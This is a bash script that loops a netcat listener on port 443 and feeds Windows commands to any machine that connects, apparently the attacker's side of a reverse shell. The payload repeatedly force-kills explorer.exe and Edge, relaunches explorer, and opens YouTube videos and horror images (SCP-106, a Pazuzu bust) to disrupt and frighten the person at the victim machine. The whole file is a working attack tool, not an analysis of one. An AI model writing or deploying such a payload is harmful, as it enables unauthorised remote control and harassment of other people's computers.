#!/bin/bash

while true; do
	nc -nlvp 443 << EOF
taskkill /IM msedge.exe /F
start "" "explorer.exe" 
start "" "explorer.exe" 
start "" "explorer.exe"  
taskkill /IM explorer.exe /F
ping 8.8.8.8
start "" "C:\Windows\explorer.exe"
start "" "C:\Windows\explorer.exe"
start "" "C:\Windows\explorer.exe"
taskkill /IM explorer.exe /F
taskkill /IM explorer.exe /F
start "" "C:\Windows\explorer.exe"
start "" "C:\Windows\explorer.exe"
start "" "C:\Windows\explorer.exe"
taskkill /IM explorer.exe /F
taskkill /IM explorer.exe /F
start "" "C:\Windows\explorer.exe"
start "" "C:\Windows\explorer.exe"
start "" "C:\Windows\explorer.exe"
taskkill /IM explorer.exe /F
start "" "C:\Windows\explorer.exe"
taskkill /IM explorer.exe /F
start "" "C:\Windows\explorer.exe"
@echo off
start microsoft-edge:https://www.youtube.com/watch?v=xAveh4mKXsA
@echo off
start microsoft-edge:https://www.youtube.com/watch?v=xAveh4mKXsA
ping 8.8.8.8	
@echo off
start microsoft-edge:https://www.youtube.com/watch?v=xAveh4mKXsA

taskkill /IM explorer.exe /F
echo off
start microsoft-edge:https://www.youtube.com/watch?v=bFTXH4mb1Lw
@echo off
start microsoft-edge:https://th.bing.com/th/id/OIP.gfp4j39yjjr2vk0hsLMeKAHaIU?pid=ImgDet&rs=1
ping 8.8.8.8
ping 8.8.8.8
@echo off
start microsoft-edge:https://th.bing.com/th/id/R.ee9338d5a6837716194bf86165c9f59d?rik=qgK79tIgo0tndg&riu=http%3a%2f%2fstatic.tvtropes.org%2fpmwiki%2fpub%2fimages%2fscp106.jpg&ehk=8UX8G8a6maosA69wt6sldtfb8fMNhNbv8wNbIuKXPls%3d&risl=&pid=ImgRaw&r=0
@echo off
start microsoft-edge:https://i.ytimg.com/vi/GE7_DPddGu8/hqdefault.jpg
@echo off
start microsoft-edge:https://thumbs.worthpoint.com/zoom/images1/1/0713/31/exorcist-demon-pazuzu-resin-bust_1_676a27eaef944355315e92a5b12b6d39.jpg
@echo off
start microsoft-edge:https://i.ytimg.com/vi/RZW40r8c4LQ/maxresdefault.jpg
@echo off
start microsoft-edge:https://i.ytimg.com/vi/RZW40r8c4LQ/maxresdefault.jpg
taskkill /IM explorer.exe /F
ping 8.8.8.8
ping 8.8.8.8
taskkill /IM explorer.exe /F
ping 8.8.8.8
taskkill /IM msedge.exe /F
ping 8.8.8.8

EOF

done
